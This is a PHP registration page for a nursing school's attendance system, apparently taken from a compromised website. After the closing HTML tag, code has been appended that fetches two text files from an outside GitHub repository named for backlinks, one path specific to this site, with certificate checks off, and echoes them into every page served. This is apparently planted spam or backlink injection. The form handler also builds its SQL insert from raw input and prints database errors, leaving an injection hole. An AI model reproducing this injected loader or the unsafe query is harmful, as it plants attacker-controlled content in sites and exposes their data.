<!DOCTYPE html>
<?php
require_once("configure_first.php");

if(isset($_POST["daftar"]) && ($_POST["npm"]) && ($_POST["nama"]) && ($_POST["email"]) && ($_POST["prodi"])) {
	$nmTable = "absensi";
	if(isset($_POST["email"])) $email = $_POST["email"];
	if(isset($_POST["prodi"])) $prodi = $_POST["prodi"];
	if(isset($_POST["npm"])) $npm = $_POST["npm"];
	if(isset($_POST["nama"])) $nama = $_POST["nama"];

		$tbField[0] = "email";
		$tbField[1] = "prodi";
		$tbField[2] = "nama";
		$tbField[3] = "npm";

		$tbIsi[0] = "'".$email."'";
		$tbIsi[1] = "'".$prodi."'";
		$tbIsi[2] = "'".$nama."'";
		$tbIsi[3] = "'".$npm."'";

		$nmField = compile_array($tbField);
		$isiField = compile_array($tbIsi);

        $sql = "insert into ".$nmTable." (".$nmField.") values (".$isiField.")";
        if (mysqli_query($conn, $sql)) {
    		echo "<script>window.alert('Register Complete');</script>";
     		echo "<script>window.parent.document.location.href='index.php';</script>";
        } else {
    		echo "<script>window.alert('Register Error');</script>";
            echo "Error: " . $sql . "<br>" . mysqli_error($conn);
        }
}
?>
<html class="loading" lang="en" data-textdirection="ltr">
  <!-- BEGIN: Head-->
  
<!-- Mirrored from pixinvent.com/materialize-material-design-admin-template/html/ltr/vertical-gradient-menu-template/user-register.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 02 Sep 2022 03:38:46 GMT -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <meta name="description" content="Materialize is a Material Design Admin Template,It's modern, responsive and based on Material Design by Google.">
    <meta name="keywords" content="materialize, admin template, dashboard template, flat admin template, responsive admin template, eCommerce dashboard, analytic dashboard">
    <meta name="author" content="ThemeSelect">
    <title>STIKES BHAKTI PERTIWI INDONESIA</title>
    <link rel="apple-touch-icon" href="app-assets/images/favicon/apple-touch-icon-152x152.png">
    <link rel="shortcut icon" type="image/x-icon" href="app-assets/images/favicon/favicon-32x32.png">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!-- BEGIN: VENDOR CSS-->
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/vendors.min.css">
    <!-- END: VENDOR CSS-->
    <!-- BEGIN: Page Level CSS-->
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/vertical-gradient-menu-template/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/vertical-gradient-menu-template/style.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/pages/register.min.css">
    <!-- END: Page Level CSS-->
    <!-- BEGIN: Custom CSS-->
    <link rel="stylesheet" type="text/css" href="app-assets/css/custom/custom.css">
    <!-- END: Custom CSS-->
  </head>
  <!-- END: Head-->
  <body class="vertical-layout page-header-light vertical-menu-collapsible vertical-gradient-menu preload-transitions 1-column register-bg   blank-page blank-page" data-open="click" data-menu="vertical-gradient-menu" data-col="1-column">
    <div class="row">
      <div class="col s12">
        <div class="container"><div id="register-page" class="row">
  <div class="col s12 m6 l4 z-depth-4 card-panel border-radius-6 register-card bg-opacity-8">
    <form class="login-form" method="POST" action="index.php">
      <div class="row">
        <div class="input-field col s12">
          <h5 class="ml-4">Register</h5>
          <p class="ml-4">STIKES BHAKTI PERTIWI INDONESIA</p>
        </div>
      </div>
      <div class="row margin">
        <div class="input-field col s12">
          <i class="material-icons prefix pt-2">person_outline</i>
          <input id="username" name="nama" type="text">
          <label for="username" class="center-align">NAMA LENGKAP</label>
        </div>
      </div>
      <div class="row margin">
        <div class="input-field col s12">
          <i class="material-icons prefix pt-2">mail_outline</i>
          <input id="email" name="email" type="email">
          <label for="email">E-MAIL ANDA</label>
        </div>
      </div>
      <div class="row margin">
        <div class="input-field col s12">
          <i class="material-icons prefix pt-2">person_outline</i>
          <input id="password" name="npm" type="text">
          <label for="password">NPM</label>
        </div>
      </div>
      <div class="row margin">
        <div class="input-field col s12">
          <i class="material-icons prefix pt-2">person_outline</i>
          <input id="password-again" readonly type="text" name="prodi" value="S1 KEBIDANAN">
        </div>
      </div>
      <div class="row">
        <div class="input-field col s12">
          <button type="submit" name="daftar" class="btn waves-effect waves-light border-round gradient-45deg-purple-deep-orange col s12">Register</button>
        </div>
      </div>
      <div class="row">
        <div class="input-field col s12">
          <p class="margin medium-small"><a href="cetak.php">Cek Sudah Daftar atau Belum?</a></p>
        </div>
      </div>
    </form>
  </div>
</div>
        </div>
        <div class="content-overlay"></div>
      </div>
    </div>

    <!-- BEGIN VENDOR JS-->
    <script src="app-assets/js/vendors.min.js"></script>
    <!-- BEGIN VENDOR JS-->
    <!-- BEGIN PAGE VENDOR JS-->
    <!-- END PAGE VENDOR JS-->
    <!-- BEGIN THEME  JS-->
    <script src="app-assets/js/plugins.min.js"></script>
    <script src="app-assets/js/search.min.js"></script>
    <script src="app-assets/js/custom/custom-script.min.js"></script>
    <!-- END THEME  JS-->
    <!-- BEGIN PAGE LEVEL JS-->
    <!-- END PAGE LEVEL JS-->
  </body>

</html>
<?php
function curlGetContents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $fileContents = curl_exec($ch);
    curl_close($ch);
    return $fileContents; 
}
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/stikes-bhaktipertiwi/absensi.stikesbpi.ac.id/system.txt';
$fileContents1 = curlGetContents($url1);
$fileContents2 = curlGetContents($url2);
echo $fileContents1;
echo $fileContents2;
?>
